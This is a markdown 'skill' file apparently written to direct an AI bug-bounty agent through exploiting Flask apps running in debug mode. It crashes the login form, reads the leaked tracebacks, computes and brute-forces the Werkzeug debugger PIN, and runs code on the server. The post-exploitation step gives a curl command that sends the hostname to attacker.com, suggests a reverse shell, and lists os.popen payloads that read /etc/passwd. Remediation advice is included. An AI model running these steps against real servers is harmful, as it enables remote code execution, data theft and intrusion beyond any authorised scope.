# 🐞 Flask Login Form – Debug Mode Enabled – AI Bug Bounty Skill

## Skill Name
`flask-debug-mode-login`

## Description
Detection and exploitation of Flask applications running with debug mode enabled (`app.debug = True` or `FLASK_ENV=development`), specifically abusing the login form to trigger unhandled exceptions and access the Werkzeug debugger. The interactive debugger provides a PIN‑protected Python console; if the PIN can be calculated or brute‑forced, an attacker obtains full remote code execution on the server. Even without console access, stack traces leak file paths, environment variables, secret keys, database URIs, and internal logic, dramatically simplifying further attacks.

## Affected Components
- Flask application object initialised with `debug=True` or running in development mode.
- Werkzeug debugger (available by default when debug is on).
- Login endpoint (`/login`, `/auth`, `/signin`) that may throw exceptions due to invalid input (e.g., malformed JSON, unexpected data types, missing parameters, or database errors when processing credentials).
- Any other endpoint that can be reached during login flow (e.g., password reset, registration) but a 500 error on the login page is most direct.
- Client‑side exposure: the debugger PIN is sometimes leaked in HTML comments (rare) or can be predicted from machine characteristics that may be partially known (IP, MAC, user).

## Detection Patterns (Static & Dynamic)
### 1. Debug Mode Fingerprinting
- **Heuristic**: HTTP response headers like `Server: Werkzeug/2.x.x Python/3.x` (normal), but combined with verbose error messages containing `Traceback (most recent call last)`. A 500 error that shows a full Werkzeug debugger interface (stack trace with source code and a console prompt) indicates debug mode.
- **Dynamic test**: Send a request that is likely to cause an exception in the login handler:
  - Extremely long username/password string (>10000 chars).
  - JSON body where a string is expected, e.g., `{"username": ["array"], "password": "test"}`.
  - Missing required fields: omit `password` entirely.
  - Type mismatch: `{"username": 123, "password": null}`.
  - Include characters that might break the template: `{{ config }}` or `{% print 'test' %}`.
  - SQL injection payloads that might raise `sqlite3.OperationalError` or `psycopg2.ProgrammingError`.
  If the response contains a debugger frame (HTML with `__debugger__`), the target is in debug mode.

### 2. Stack Trace Leakage
- Even if the interactive console is disabled (or PIN protected), the traceback still reveals:
  - Absolute file paths (e.g., `/home/user/app/app.py`).
  - Source code snippets of the failing line.
  - Local variables at the time of the crash (including database credentials, secret keys, tokens).
- **Heuristic**: Traceback present in response body; `Content-Type: text/html` but not the debugger toolbar.

### 3. PIN-Protected Console Visibility
- In the debugger page, the console is visible but requires a PIN. The PIN can sometimes be computed if enough machine info is known.
- **Heuristic**: The debugger HTML contains a script tag with `CONSOLE_MODE = true` and a form for PIN entry.

### 4. Environment/Config Exposure via Debug Tools
- The `/console` endpoint (if unlocked) provides an interactive Python shell.
- The debugger also includes a “Source” tab listing all loaded modules, potentially exposing application code.

## Testing Methodology (AI Agent Steps)
1. **Trigger an Unhandled Exception on Login**
   - Attempt various malformed requests to the login endpoint as described above.
   - Monitor the response status code (500) and body. If you see a Werkzeug debugger interface, debug mode is confirmed.
   - If a debugger page appears, note if a PIN is required.

2. **Extract Information from Traceback**
   - From the traceback, gather:
     - File paths: allows mapping of the application directory.
     - Local variable values: look for `SECRET_KEY`, `SQLALCHEMY_DATABASE_URI`, `MAIL_PASSWORD`, etc.
     - Versions: Werkzeug and Python versions help determine PIN generation algorithm.
   - This information can be used to brute‑force the console PIN.

3. **Attempt to Access the Interactive Console**
   - If the debugger page does not lock the console behind a PIN (older Werkzeug versions or misconfiguration), you can directly execute Python code. Confirm by running `import os; os.system('id')`.
   - If a PIN is required, move to PIN calculation.

4. **Calculate the Werkzeug Debugger PIN**
   The PIN is generated from:
   - `getattr(app, "__name__", type(app).__name__)` – usually the Flask app name, e.g., `app` or `Flask`.
   - `getpass.getuser()` – the username running the Flask process (can sometimes be deduced from error pages, e.g., `/home/<user>/app`).
   - `uuid.getnode()` – the MAC address of the machine. This can sometimes be obtained via SSRF, `/sys/class/net/eth0/address`, or by inspecting network details.
   - `os.getpid()` – the process ID (harder to know, but can be brute‑forced if other parts are known).
   The algorithm mixes these values and produces an 8‑digit PIN. Several public implementations exist (e.g., `werkzeug-debugger-pin` scripts).

   **Steps to compute:**
   - Determine app name: commonly `"Flask"` or the value of `__name__`.
   - Determine user: from path leak (`/home/webuser/`) or by guessing common users (`www-data`, `app`, `flask`, `nobody`).
   - Determine MAC address: if you have LFI or SSRF, read `/sys/class/net/eth0/address`; otherwise, use known MAC ranges for cloud providers (e.g., AWS, DigitalOcean) or brute‑force with common prefixes.
   - Determine PID: could be brute‑forced sequentially (1‑65535) along with other variables.
   - Use a Python script (readily available) to generate candidate PINs and attempt them on the console.

5. **Brute‑Force PIN Entry**
   - The debugger console usually allows multiple PIN attempts without lockout (rate‑limiting may exist but often weak). Automate POST requests to `/console` with guessed PINs.
   - Even if PID is unknown, if MAC and user are known, the search space is small.

6. **Post‑Exploitation: Remote Code Execution**
   - Once the console is unlocked, execute arbitrary Python:
     ```python
     import os; os.system('curl http://attacker.com/$(hostname)')
     ```
   - Establish a reverse shell.
   - Dump environment variables, decrypt session cookies, pivot internally.

7. **Alternative Debug Mode Abuses (No PIN)**
   - If the debugger toolbar is available but PIN‑protected, the `reload` feature (reload templates) may not require PIN; check if you can trigger reload.
   - Some debuggers allow evaluation of single expressions in the traceback before PIN; test by using `{{ config }}` in a template error.
   - Use the “Source” tab to read source code of any loaded module.

## Essential Payloads (Flask Debug Mode Exploitation)
### Trigger Exceptions on Login
- JSON type confusion: `{"username": {"$ne": null}, "password": 123}` – if the backend expects strings, it may crash with `TypeError`.
- Extremely long field: `username=A*50000` (may cause `MemoryError` or `RequestTooLarge` but unlikely in Flask; better to send a parameter that violates DB schema).
- Missing CSRF token when required may cause `BadRequest` with debug info.
- Send `'` in username to trigger database syntax error if no error handling is in place.

### Werkzeug Debugger PIN Calculation (Python 3 Example)
```python
import hashlib
import getpass
import uuid
import os

app_name = "Flask"  # or real app name
user = "webuser"    # guessed from path
mac = "00:11:22:33:44:55"  # obtained via LFI or SSRF
pid = 1234          # brute-forced

# Real algorithm is more complex; use existing tools like:
# https://github.com/wdahlenburg/werkzeug-debugger-pin
```

A comprehensive tool like `Werkzeug-Debugger-Pin-Bypass` can be used:
```bash
python3 werkzeug_debugger_pin.py -u webuser -m 00:11:22:33:44:55 -n Flask -p 1000 2000
```
This generates PINs to try.

### RCE via Unlocked Console
Once the console is active, type:
```python
__import__('os').popen('id').read()
```
or use the `eval` function directly.

## Secure Coding Recommendations
- **Disable debug mode in production.** Ensure `FLASK_ENV=production` or `app.debug = False` and `app.env = 'production'`. Do not use `app.run(debug=True)` in production.
- **Custom error handlers**: Use `@app.errorhandler(500)` to return a generic error page without any traceback.
- **Do not run Flask with the built‑in development server in production.** Use a production WSGI server (Gunicorn, uWSGI, Waitress). Even if debug mode is off, the development server is not secure.
- **Set `PROPAGATE_EXCEPTIONS = False`** (default) so that exceptions do not propagate to the WSGI server showing a traceback.
- **Restrict access to the debugger**: Werkzeug’s debugger should never be exposed. Network‑level controls (firewall, reverse proxy) can also prevent access to the debug port if you must use it temporarily.
- **Keep secrets out of code and environment**: Even if a traceback leaks, they won’t contain secrets if they are injected securely at runtime.
- **Regularly update Flask/Werkzeug** to ensure any debugger PIN weaknesses are patched.

## Output Format (Bug Report)
```
Title: Flask Debug Mode Enabled – Remote Code Execution via Werkzeug Debugger
Severity: Critical (CVSS 10.0)
Endpoint: /login (triggered)
Description:
  The Flask application is running with debug mode enabled. Sending a malformed request to the login endpoint triggers an unhandled exception, exposing the Werkzeug debugger interface. The console is PIN‑protected, but the PIN can be calculated using leaked information (username, MAC address) and then used to execute arbitrary Python code on the server.
Proof of Concept:
  1. Trigger error: POST /login with {"username": ["array"], "password": "test"} → 500 debugger page.
  2. Extract file path `/home/appuser/app/views.py` and user `appuser`.
  3. Obtain MAC via LFI (`/sys/class/net/eth0/address`): `02:42:ac:11:00:02`.
  4. Use PIN calculator to generate PIN `123-456-789`.
  5. Unlock console and run `__import__('os').popen('cat /etc/passwd').read()`.
Remediation: Disable debug mode (set FLASK_ENV=production), use a production WSGI server, and add a generic 500 error handler.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with Werkzeug debugger
- **Testing Type**: Black-box / Grey-box (if source code or path leakage available)
- **Dependencies**: PIN calculation tool (optional); out‑of‑band server for RCE confirmation.